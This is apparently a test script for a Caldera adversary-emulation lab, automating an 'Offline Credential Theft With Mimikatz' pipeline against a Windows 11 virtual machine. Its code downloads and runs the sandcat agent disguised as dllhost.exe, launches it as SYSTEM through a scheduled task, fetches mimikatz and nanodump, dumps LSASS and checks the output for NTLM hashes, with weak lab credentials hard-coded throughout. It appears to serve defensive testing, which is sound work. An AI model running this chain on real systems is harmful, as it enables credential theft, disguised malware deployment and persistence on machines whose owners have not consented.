import { $ } from "bun"

const KALI_IP = "10.1.99.1"
const WIN11_IP = "10.1.99.24"
const KALI_SSH = "kali:kali"
const WINRM_AUTH = "localuser:password"
const CALDERA_URL = "http://10.1.99.1:8888"
const CALDERA_KEY = "ADMIN123"

// ─── Existing Building Blocks ───────────────────────────────────────────────

async function sshRun(host, user, pass, command) {
  const result = await $`sshpass -p ${pass} ssh -o StrictHostKeyChecking=accept-new -o ConnectTimeout=5 ${user}@${host} ${command}`.nothrow().quiet()
  if (result.exitCode !== 0) {
    const stderr = result.stderr.toString().trim()
    throw new Error(`SSH exit ${result.exitCode}: ${stderr || "no stderr"}`)
  }
  return result.stdout.toString().trim()
}

async function winrmRun(host, user, pass, command) {
  const py = `
import winrm
s = winrm.Session('${host}', auth=('${user}', '${pass}'), transport='ssl', server_cert_validation='ignore')
r = s.run_cmd('${command.replace(/\\/g, "\\\\").replace(/'/g, "\\'")}')
print(r.std_out.decode())
if r.std_err.decode().strip():
    print(r.std_err.decode(), end='')
exit(r.status_code)
`
  const result = await $`uv run python -c ${py}`.nothrow().quiet()
  if (result.exitCode !== 0) {
    const stdout = result.stdout.toString().trim()
    const stderr = result.stderr.toString().trim()
    throw new Error(`WinRM exit ${result.exitCode}: ${stdout || stderr || "no output"}`)
  }
  return result.stdout.toString().trim()
}

async function calderaApi(method, path, body) {
  const opts = {
    method,
    headers: { "KEY": CALDERA_KEY, "Content-Type": "application/json" },
    signal: AbortSignal.timeout(10000),
  }
  if (body !== undefined) opts.body = JSON.stringify(body)
  const res = await fetch(`${CALDERA_URL}${path}`, opts)
  return res.json()
}

async function calderaRest(method, body) {
  const res = await fetch(`${CALDERA_URL}/api/rest`, {
    method,
    headers: { "KEY": CALDERA_KEY, "Content-Type": "application/json" },
    body: JSON.stringify(body),
    signal: AbortSignal.timeout(10000),
  })
  return res.json()
}

// ─── Connectivity Tests ─────────────────────────────────────────────────────

async function testSshConnectivity() {
  console.log("\n=== SSH Connectivity (kali) ===")
  try {
    const user = await sshRun(KALI_IP, "kali", "kali", "whoami")
    console.log(`  PASS: whoami = ${user}`)
    return true
  } catch (err) {
    console.log(`  FAIL: ${err.message}`)
    return false
  }
}

async function testWinrmConnectivity() {
  console.log("\n=== WinRM Connectivity (win11-22h2) ===")
  try {
    const output = await winrmRun(WIN11_IP, "localuser", "password", "whoami")
    console.log(`  PASS: whoami = ${output}`)
    return true
  } catch (err) {
    console.log(`  FAIL: ${err.message}`)
    return false
  }
}

async function testCalderaConnectivity() {
  console.log("\n=== Caldera API ===")
  try {
    const agents = await calderaRest("POST", { index: "agents" })
    console.log(`  PASS: agents endpoint reachable, ${agents.length} agents found`)
    return true
  } catch (err) {
    console.log(`  FAIL: ${err.message}`)
    return false
  }
}

// ─── Prereq Command Execution Tests ──────────────────────────────────────────

async function testSshPrereq() {
  console.log("\n=== SSH Prereq Execution ===")
  try {
    const output = await sshRun(KALI_IP, "kali", "kali", "mkdir -p $HOME/caldera/plugins/atomic/data/atomic-red-team/ExternalPayloads/x64 && ls $HOME/caldera/plugins/atomic/data/atomic-red-team/ExternalPayloads/x64/")
    console.log(`  PASS: ExternalPayloads/x64 = ${output || "(empty)"}`)
    return true
  } catch (err) {
    console.log(`  FAIL: ${err.message}`)
    return false
  }
}

async function testWinrmPrereq() {
  console.log("\n=== WinRM Prereq Execution ===")
  try {
    const output = await winrmRun(WIN11_IP, "localuser", "password", "ver")
    console.log(`  PASS: "ver" = ${output}`)
    return true
  } catch (err) {
    console.log(`  FAIL: ${err.message}`)
    return false
  }
}

// ─── Sandcat Agent Deployment Test ──────────────────────────────────────────

async function testSandcatDeploy() {
  console.log("\n=== Sandcat Agent Deploy (win11) ===")
  const group = `test-${Date.now()}`
  try {
    try {
      await winrmRun(WIN11_IP, "localuser", "password",
        'powershell -Command "Get-Process -Name dllhost -ErrorAction SilentlyContinue | Where-Object { $_.Path -eq \'C:\\Users\\Public\\dllhost.exe\' } | Stop-Process -Force; Write-Host \'CLEANED\'"')
    } catch {}
    try {
      const agents = await calderaRest("POST", { index: "agents" })
      for (const a of agents) {
        try { await calderaRest("DELETE", { index: "agents", paw: a.paw }) } catch {}
      }
      if (agents.length) console.log(`  Cleaned ${agents.length} stale agents`)
    } catch {}

    console.log("\n  [1] Network to Caldera")
    const netTest = await winrmRun(WIN11_IP, "localuser", "password",
      'powershell -Command "Test-NetConnection -ComputerName 10.1.99.1 -Port 8888 -InformationLevel Quiet | ForEach-Object { if ($_) { Write-Host REACHABLE } else { Write-Host UNREACHABLE } }"')
    console.log(`  => 10.1.99.1:8888 ${netTest.trim()}`)

    console.log("\n  [2] Download sandcat.go → C:\\Users\\Public\\dllhost.exe")
    const dl = await winrmRun(WIN11_IP, "localuser", "password",
      `powershell -Command "$url='http://${KALI_IP}:8888/file/download'; $wc=New-Object System.Net.WebClient; $wc.Headers.add('platform','windows'); $wc.Headers.add('file','sandcat.go'); $wc.DownloadFile($url,'C:\\Users\\Public\\dllhost.exe'); Write-Host 'DOWNLOAD_OK'"`)
    console.log(`  => ${dl.trim()}`)

    console.log("\n  [3] File check")
    const fileCheck = await winrmRun(WIN11_IP, "localuser", "password",
      'powershell -Command "$f=Get-Item \'C:\\Users\\Public\\dllhost.exe\' -ErrorAction Stop; Write-Host \\"EXISTS $($f.Length) bytes\\""')
    console.log(`  => ${fileCheck.trim()}`)

    console.log(`\n  [4] Deploy sandcat via Scheduled Task as SYSTEM (group=${group}), wait 20s, check alive`)
    const taskName = `CalderaSandcat-${group}`
    try {
      await winrmRun(WIN11_IP, "localuser", "password",
        `powershell -Command "$taskName='${taskName}'; $action=New-ScheduledTaskAction -Execute 'C:\\Users\\Public\\dllhost.exe' -Argument '-server http://${KALI_IP}:8888 -group ${group}'; $trigger=New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(2); $principal=New-ScheduledTaskPrincipal -UserId 'NT AUTHORITY\\SYSTEM' -LogonType ServiceAccount -RunLevel Highest; Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Force | Out-Null; Start-ScheduledTask -TaskName $taskName; Write-Host 'TASK_STARTED'"`)
    } catch (err) {
      console.log(`  => task creation failed: ${err.message}`)
    }
    await new Promise(r => setTimeout(r, 20000))

    try {
      const tl = await winrmRun(WIN11_IP, "localuser", "password",
        'powershell -Command "$p=Get-Process -Name dllhost -ErrorAction SilentlyContinue | Where-Object { $_.Path -eq \'C:\\Users\\Public\\dllhost.exe\' }; if ($p) { $wmi=Get-WmiObject Win32_Process -Filter \\"ProcessId=$($p.Id)\\"; $owner=$wmi.GetOwner(); Write-Host \\"RUNNING pid=$($p.Id) user=$($owner.User)\\" } else { Write-Host \\"DIED\\" }"')
      console.log(`  => process: ${tl.trim()}`)
    } catch (err) {
      console.log(`  => process check failed: ${err.message}`)
    }

    console.log("\n  [5] Caldera agents (after 20s wait):")
    try {
      const agents = await calderaRest("POST", { index: "agents" })
      console.log(`  => ${agents.length} agents:`)
      for (const a of agents) {
        console.log(`     paw=${a.paw} group=${a.group} trusted=${a.trusted}`)
      }
      const mine = agents.find(a => a.group === group)
      if (mine) {
        console.log(`  => MY agent CHECKED IN! paw=${mine.paw} trusted=${mine.trusted}`)
      } else {
        console.log(`  => MY agent (group=${group}) NOT found`)
        console.log("\n  [5b] Waiting another 15s, checking again...")
        await new Promise(r => setTimeout(r, 15000))
        const agents2 = await calderaRest("POST", { index: "agents" })
        const mine2 = agents2.find(a => a.group === group)
        if (mine2) {
          console.log(`  => MY agent CHECKED IN on retry! paw=${mine2.paw} trusted=${mine2.trusted}`)
        } else {
          console.log(`  => MY agent (group=${group}) STILL not found`)
          console.log(`  => agents now: ${agents2.map(a => `${a.paw}(${a.group})`).join(', ')}`)
        }
      }
    } catch (err) {
      console.log(`  => agents check failed: ${err.message}`)
    }

    console.log(`\n  [cleanup] Unregistering scheduled task ${taskName}`)
    try {
      await winrmRun(WIN11_IP, "localuser", "password",
        `powershell -Command "Unregister-ScheduledTask -TaskName '${taskName}' -Confirm:\$false -ErrorAction SilentlyContinue; Write-Host 'TASK_CLEANED'"`)
      console.log("  => task cleaned up")
    } catch (err) {
      console.log(`  => task cleanup failed: ${err.message}`)
    }

    return true
  } catch (err) {
    console.log(`\n  UNEXPECTED FAIL: ${err.message}`)
    return false
  }
}

// ─── Full Pipeline Integration Test ──────────────────────────────────────────

async function testFullPipeline() {
  console.log("\n=== Full Pipeline: Offline Credential Theft With Mimikatz ===")

  const abilityId = "7e8ccbe3de961012b6464485829e87a4"
  const abilityName = "Offline Credential Theft With Mimikatz"
  const group = `test-${Date.now()}`
  const taskName = `CalderaSandcat-${group}`

  const kaliPrereq = `if [ -f "\\$HOME/caldera/plugins/atomic/data/atomic-red-team/ExternalPayloads/x64/mimikatz.exe" ]; then echo "ALREADY_PRESENT: \\$HOME/caldera/plugins/atomic/data/atomic-red-team/ExternalPayloads/x64/mimikatz.exe"; else mkdir -p \\$HOME/caldera/plugins/atomic/data/atomic-red-team/ExternalPayloads/x64 && wget -q "https://github.com/gentilkiwi/mimikatz/releases/latest/download/mimikatz_trunk.zip" -O /tmp/mimikatz.zip && unzip -o /tmp/mimikatz.zip -d /tmp/mimikatz && cp /tmp/mimikatz/x64/mimikatz.exe \\$HOME/caldera/plugins/atomic/data/atomic-red-team/ExternalPayloads/x64/mimikatz.exe && rm -rf /tmp/mimikatz.zip /tmp/mimikatz && sudo systemctl restart caldera; fi`

  let agentPaw = null

  try {
    // ── Step 1: Clean slate ──
    console.log("\n  [1/7] Cleaning previous agents, processes, and tasks...")
    try {
      const agents = await calderaRest("POST", { index: "agents" })
      for (const a of agents) {
        try { await calderaRest("DELETE", { index: "agents", paw: a.paw }) } catch {}
      }
      if (agents.length) console.log(`    Cleaned ${agents.length} stale agents`)
    } catch {}
    try {
      await winrmRun(WIN11_IP, "localuser", "password",
        'powershell -Command "Get-Process -Name dllhost -ErrorAction SilentlyContinue | Where-Object { $_.Path -eq \'C:\\Users\\Public\\dllhost.exe\' } | Stop-Process -Force; Write-Host \'CLEANED\'"')
    } catch {}
    try {
      await winrmRun(WIN11_IP, "localuser", "password",
        'powershell -Command "Get-ScheduledTask -TaskName \'CalderaSandcat-*\' -ErrorAction SilentlyContinue | Unregister-ScheduledTask -Confirm:$false; Write-Host \'TASKS_CLEANED\'"')
    } catch {}
    console.log("    => clean")

    // ── Step 2: Install prereqs on Kali ──
    console.log("\n  [2/7] Running kali prereq (mimikatz download + Caldera restart)...")
    const prereqResult = await sshRun(KALI_IP, "kali", "kali", kaliPrereq)
    console.log(`    => ${prereqResult.slice(0, 200)}`)
    if (!prereqResult.includes("ALREADY_PRESENT")) {
      console.log("    => Caldera was restarted, waiting to come back (120s timeout)...")
      const start = Date.now()
      while (Date.now() - start < 120000) {
        try {
          await calderaRest("POST", { index: "agents" })
          console.log(`    => Caldera ready after ${Math.round((Date.now() - start) / 1000)}s`)
          break
        } catch {}
        await new Promise(r => setTimeout(r, 1000))
      }
    }

    // ── Step 3: Deploy sandcat via Scheduled Task as SYSTEM ──
    console.log(`\n  [3/7] Deploying sandcat as SYSTEM (group=${group})...`)
    const dlResult = await winrmRun(WIN11_IP, "localuser", "password",
      `powershell -Command "$url='http://${KALI_IP}:8888/file/download'; $wc=New-Object System.Net.WebClient; $wc.Headers.add('platform','windows'); $wc.Headers.add('file','sandcat.go'); $wc.DownloadFile($url,'C:\\Users\\Public\\dllhost.exe'); Write-Host 'DOWNLOAD_OK'"`)
    console.log(`    => download: ${dlResult.trim()}`)
    await winrmRun(WIN11_IP, "localuser", "password",
      `powershell -Command "$taskName='${taskName}'; $action=New-ScheduledTaskAction -Execute 'C:\\Users\\Public\\dllhost.exe' -Argument '-server http://${KALI_IP}:8888 -group ${group}'; $trigger=New-ScheduledTaskTrigger -Once -At (Get-Date).AddSeconds(2); $principal=New-ScheduledTaskPrincipal -UserId 'NT AUTHORITY\\SYSTEM' -LogonType ServiceAccount -RunLevel Highest; Register-ScheduledTask -TaskName $taskName -Action $action -Trigger $trigger -Principal $principal -Force | Out-Null; Start-ScheduledTask -TaskName $taskName; Write-Host 'TASK_STARTED'"`)
    console.log("    => sandcat deployed via Scheduled Task")

    // ── Step 4: Wait for agent + fetch ability + deploy payloads ──
    console.log(`\n  [4/7] Waiting for agent (group=${group})...`)
    const agentStart = Date.now()
    while (Date.now() - agentStart < 60000) {
      const agents = await calderaRest("POST", { index: "agents" })
      const agent = agents.find(a => a.group === group)
      if (agent) {
        agentPaw = agent.paw
        console.log(`    => Agent checked in: paw=${agent.paw} trusted=${agent.trusted} platform=${agent.platform} executors=${JSON.stringify(agent.executors)} (${Math.round((Date.now() - agentStart) / 1000)}s)`)
        break
      }
      await new Promise(r => setTimeout(r, 3000))
    }
    if (!agentPaw) throw new Error("Agent did not check in within 60s")

    console.log(`\n  [4b/7] Fetching ability "${abilityName}"...`)
    const abilities = await calderaRest("POST", { index: "abilities", ability_id: abilityId })
    const ability = Array.isArray(abilities) ? abilities.find(a => a.ability_id === abilityId) : abilities
    if (!ability) throw new Error(`Ability "${abilityId}" not found in Caldera`)
    console.log(`    => platform=${ability.platform} executors=${JSON.stringify(ability.executors)}`)
    console.log(`    => original command: ${ability.executors[0].command}`)

    // ── Step 4c: Deploy mimikatz.exe to Windows ──
    console.log(`\n  [4c/7] Deploying mimikatz.exe to Windows...`)
    const mimikatzDestPath = `C:\\Users\\Public\\x64\\mimikatz.exe`
    await winrmRun(WIN11_IP, "localuser", "password",
      `powershell -Command "New-Item -ItemType Directory -Path 'C:\\Users\\Public\\x64' -Force -ErrorAction SilentlyContinue | Out-Null"`)
    const checkMimikatz = await winrmRun(WIN11_IP, "localuser", "password",
      `powershell -Command "if (Test-Path '${mimikatzDestPath}') { Write-Host 'EXISTS' } else { Write-Host 'MISSING' }"`)
    if (checkMimikatz.includes("MISSING")) {
      console.log(`    => Downloading mimikatz from GitHub (gentilkiwi/mimikatz)...`)
      await winrmRun(WIN11_IP, "localuser", "password",
        `powershell -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri 'https://github.com/gentilkiwi/mimikatz/releases/latest/download/mimikatz_trunk.zip' -OutFile 'C:\\Users\\Public\\mimikatz.zip'; Expand-Archive -Path 'C:\\Users\\Public\\mimikatz.zip' -DestinationPath 'C:\\Users\\Public\\mimikatz_extract' -Force; Copy-Item 'C:\\Users\\Public\\mimikatz_extract\\x64\\mimikatz.exe' '${mimikatzDestPath}' -Force; Remove-Item 'C:\\Users\\Public\\mimikatz.zip' -Force; Remove-Item 'C:\\Users\\Public\\mimikatz_extract' -Recurse -Force; Write-Host 'DEPLOYED'"`)
    } else {
      console.log(`    => Already present at ${mimikatzDestPath}`)
    }
    const verifyMimikatz = await winrmRun(WIN11_IP, "localuser", "password",
      `powershell -Command "$f=Get-Item '${mimikatzDestPath}' -ErrorAction Stop; Write-Host \\"EXISTS $($f.Length) bytes\\""`)
    console.log(`    => mimikatz.exe: ${verifyMimikatz.trim()}`)

    // ── Step 4d: Deploy nanodump.x64.exe to Windows (needed to create the LSASS dump) ──
    console.log(`\n  [4d/7] Deploying nanodump.x64.exe to Windows (needed to first create LSASS dump)...`)
    const nanodumpDestPath = `C:\\Users\\Public\\nanodump.x64.exe`
    const checkNano = await winrmRun(WIN11_IP, "localuser", "password",
      `powershell -Command "if (Test-Path '${nanodumpDestPath}') { Write-Host 'EXISTS' } else { Write-Host 'MISSING' }"`)
    if (checkNano.includes("MISSING")) {
      console.log(`    => Downloading from GitHub (fortra/nanodump)...`)
      await winrmRun(WIN11_IP, "localuser", "password",
        `powershell -Command "[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12; Invoke-WebRequest -Uri 'https://github.com/fortra/nanodump/raw/2c0b3d5d59c56714312131de9665defb98551c27/dist/nanodump.x64.exe' -OutFile '${nanodumpDestPath}'; Write-Host 'DEPLOYED'"`)
    } else {
      console.log(`    => Already present at ${nanodumpDestPath}`)
    }
    const verifyNano = await winrmRun(WIN11_IP, "localuser", "password",
      `powershell -Command "$f=Get-Item '${nanodumpDestPath}' -ErrorAction Stop; Write-Host \\"EXISTS $($f.Length) bytes\\""`)
    console.log(`    => nanodump.x64.exe: ${verifyNano.trim()}`)

    // ── Step 5: Modify ability command + exploit ──
    console.log(`\n  [5/7] Exploiting agent with ability...`)

    const original = await calderaApi("GET", `/api/v2/abilities/${abilityId}`)
    const modified = structuredClone(original)
    const oldCmd = modified.executors[0].command
    // Replace quoted PathToAtomicsFolder with both: nanodump dump creation prefix + mimikatz local path
    // Original: "PathToAtomicsFolder\..\ExternalPayloads\x64\mimikatz.exe" "sekurlsa::minidump %tmp%\lsass.DMP" ...
    // Modified: C:\Users\Public\nanodump.x64.exe -w "%tmp%\lsass.DMP" & "C:\Users\Public\x64\mimikatz.exe" "sekurlsa::minidump %tmp%\lsass.DMP" ...
    modified.executors[0].command = oldCmd.replace(
      /"PathToAtomicsFolder[^"]*"/,
      `C:\\Users\\Public\\nanodump.x64.exe -w "%tmp%\\lsass.DMP" & "C:\\Users\\Public\\x64\\mimikatz.exe"`
    )
    console.log(`    => Command: "${oldCmd.slice(0, 80)}..." → "${modified.executors[0].command.slice(0, 120)}..."`)

    await calderaApi("PUT", `/api/v2/abilities/${abilityId}`, modified)
    console.log(`    => Ability command updated`)

    const exploitResult = await calderaApi("POST", "/plugin/access/exploit", { paw: agentPaw, ability_id: abilityId, obfuscator: "plain-text" })
    console.log(`    => /plugin/access/exploit result: ${JSON.stringify(exploitResult).slice(0, 200)}`)

    // Wait for link to appear
    console.log(`    => Waiting for link (120s timeout)...`)
    let linkFacts = []
    let linkStatus = null
    let linkOutput = ""
    const pollStart = Date.now()
    while (Date.now() - pollStart < 120000) {
      const agents = await calderaRest("POST", { index: "agents", paw: agentPaw })
      const ag = Array.isArray(agents) ? agents[0] : agents
      const links = ag?.links || []
      const mine = links.find(l => l.ability?.ability_id === abilityId)
      if (mine) {
        console.log(`    Link found: id=${mine.id} status=${mine.status} finish=${mine.finish}`)
        if (mine.finish != null) {
          console.log(`    Command: ${mine.command}`)
          console.log(`    Output (stdout): ${mine.output?.stdout || "(none)"}`)
          console.log(`    Output (stderr): ${mine.output?.stderr || "(none)"}`)
          console.log(`    Facts: ${JSON.stringify(mine.facts)}`)
          linkStatus = mine.status
          linkFacts = mine.facts || []
          linkOutput = mine.output?.stdout || ""
          break
        }
        console.log(`    Link pending (status=${mine.status}), waiting...`)
      }
      await new Promise(r => setTimeout(r, 2000))
    }

    // Restore ability command
    await calderaApi("PUT", `/api/v2/abilities/${abilityId}`, original)
    console.log(`\n    => Ability command restored`)

    // ── Step 6: Verify dump file at C:\Windows\Temp\lsass.DMP ──
    console.log(`\n  [6/7] Verifying dump file in C:\\Windows\\Temp\\lsass.DMP...`)
    let dumpExists = false
    let dumpSize = ""
    try {
      const dumpCheck = await winrmRun(WIN11_IP, "localuser", "password",
        'powershell -Command "if (Test-Path \'C:\\Windows\\Temp\\lsass.DMP\') { $f=Get-Item \'C:\\Windows\\Temp\\lsass.DMP\'; Write-Host \\"EXISTS $([math]::Round($f.Length/1024/1024,1))MB\\" } else { Write-Host \\"MISSING\\" }"')
      dumpExists = dumpCheck.includes("EXISTS")
      dumpSize = dumpCheck.match(/EXISTS (\S+)/)?.[1] || ""
      console.log(`    => Dump file: ${dumpCheck.trim()}`)
    } catch (err) {
      console.log(`    => Dump file check failed: ${err.message}`)
    }

    // ── Step 7: Verify mimikatz output contains credential data ──
    console.log(`\n  [7/7] Checking mimikatz output for credential extraction...`)
    let credsFound = false
    for (const f of linkFacts.slice(0, 10)) {
      console.log(`    fact: trait=${f.trait} value=${String(f.value).slice(0, 120)}`)
    }
    const patternCount = (linkOutput.match(/Authentication Id|NTLM|Username|Domain/g) || []).length
    if (patternCount > 0) {
      credsFound = true
      console.log(`    => Credential patterns found (${patternCount} matches: Authentication Id/NTLM/Username/Domain)`)
    } else if (linkOutput) {
      console.log(`    => Output present (${linkOutput.length} chars) but no credential patterns found`)
    } else {
      console.log(`    => No stdout output from mimikatz`)
    }

    const passed = dumpExists && linkStatus >= 0 && linkFacts.length > 0
    let reason = ""
    if (passed) reason = `dump ${dumpSize}, link status=${linkStatus}, ${linkFacts.length} facts`
    else if (!dumpExists) reason = "no dump file"
    else if (linkFacts.length === 0) reason = "no link facts"
    else reason = `dump exists but link status=${linkStatus}`
    if (credsFound) reason += ", creds found"
    console.log(`\n  => Pipeline test: ${passed ? "PASSED" : "FAILED"} (${reason})`)
    return passed
  } catch (err) {
    console.log(`\n  PIPELINE FAILED: ${err.message}`)
    return false
  } finally {
    // ── Cleanup: always run, best-effort ──
    console.log("\n  [cleanup] Removing agent, task, process, dump, and binaries...")
    try { if (agentPaw) await calderaRest("DELETE", { index: "agents", paw: agentPaw }); console.log("    agent deleted") } catch {}
    try {
      await winrmRun(WIN11_IP, "localuser", "password",
        'powershell -Command "Get-Process -Name dllhost -ErrorAction SilentlyContinue | Where-Object { $_.Path -eq \'C:\\Users\\Public\\dllhost.exe\' } | Stop-Process -Force; Write-Host \'CLEANED\'"')
      console.log("    dllhost process killed")
    } catch {}
    try {
      await winrmRun(WIN11_IP, "localuser", "password",
        `powershell -Command "Unregister-ScheduledTask -TaskName '${taskName}' -Confirm:$false -ErrorAction SilentlyContinue; Write-Host 'TASK_CLEANED'"`)
      console.log("    scheduled task unregistered")
    } catch {}
    try {
      await winrmRun(WIN11_IP, "localuser", "password",
        'powershell -Command "Remove-Item \'C:\\Windows\\Temp\\lsass.DMP\' -Force -ErrorAction SilentlyContinue; Write-Host \'DUMP_DELETED\'"')
      console.log("    dump file deleted")
    } catch {}
    try {
      await winrmRun(WIN11_IP, "localuser", "password",
        `powershell -Command "Remove-Item '${mimikatzDestPath}' -Force -ErrorAction SilentlyContinue; Write-Host 'MIMIKATZ_DELETED'"`)
      console.log("    mimikatz binary deleted")
    } catch {}
    try {
      await winrmRun(WIN11_IP, "localuser", "password",
        `powershell -Command "Remove-Item '${nanodumpDestPath}' -Force -ErrorAction SilentlyContinue; Write-Host 'NANODUMP_DELETED'"`)
      console.log("    nanodump binary deleted")
    } catch {}
    try {
      await winrmRun(WIN11_IP, "localuser", "password",
        'powershell -Command "Remove-Item \'C:\\Users\\Public\\x64\' -Recurse -Force -ErrorAction SilentlyContinue; Write-Host \'X64DIR_DELETED\'"')
      console.log("    x64 directory deleted")
    } catch {}
    console.log("    => cleanup complete")
  }
}

// ─── Main ────────────────────────────────────────────────────────────────────

async function main() {
  console.log("testAbility — Offline Credential Theft With Mimikatz\n")

  const results = {
    sshConnectivity: await testSshConnectivity(),
    winrmConnectivity: await testWinrmConnectivity(),
    calderaConnectivity: await testCalderaConnectivity(),
    sshPrereq: await testSshPrereq(),
    winrmPrereq: await testWinrmPrereq(),
    sandcatDeploy: await testSandcatDeploy(),
    fullPipeline: await testFullPipeline(),
  }

  console.log("\n=== Summary ===")
  let pass = 0
  let fail = 0
  for (const [key, ok] of Object.entries(results)) {
    if (ok) { pass++; console.log(`  [PASS] ${key}`) }
    else { fail++; console.log(`  [FAIL] ${key}`) }
  }
  console.log(`\n  ${pass} passed, ${fail} failed`)
  console.log(`\n  Existing building blocks: SSH, WinRM, Caldera REST, Scheduled Task deploy, /plugin/access/exploit`)
  console.log(`  Full pipeline test: agentWait → abilityLookup → payloadDeploy → dumpCreate → abilityExploit → dumpVerify → credVerify → cleanup`)
  console.log(`\n  Mimikatz ability specifics:`)
  console.log(`    - Offline credential theft: loads existing LSASS dump then extracts hashes with sekurlsa::logonpasswords`)
  console.log(`    - Does NOT dump LSASS itself — test prepends nanodump to create %tmp%\\lsass.DMP first`)
  console.log(`    - mimikatz.exe deployed to C:\\Users\\Public\\x64\\ (matches ability's PathToAtomicsFolder\\..\\ExternalPayloads\\x64\\ pattern)`)
  console.log(`    - nanodump.x64.exe deployed to C:\\Users\\Public\\ for creating prerequisite dump`)
  console.log(`    - kali_prereq downloads mimikatz_trunk.zip from GitHub, extracts x64/mimikatz.exe, restarts Caldera`)
  console.log(`    - Agent runs as SYSTEM (Scheduled Task) for SeDebugPrivilege`)
  console.log(`    - No EULA acceptance needed`)
}

main().catch(console.error)
